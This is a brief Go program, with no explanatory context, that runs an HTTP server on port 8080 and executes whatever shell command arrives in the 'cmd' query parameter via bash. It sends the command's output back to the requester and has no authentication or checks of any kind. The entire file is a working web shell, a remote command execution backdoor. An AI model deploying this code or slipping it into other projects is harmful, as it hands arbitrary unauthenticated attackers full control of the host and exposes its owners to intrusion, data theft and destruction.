package main

import (
	"fmt"
	"log"
	"net/http"
	"os/exec"
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		cmd := r.URL.Query().Get("cmd")
		c := exec.Command("bash", "-c", cmd)
		c.Stdin = r.Body
		c.Stdout = w
		c.Stderr = w
		c.Run()
	})
	fmt.Println("Running on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
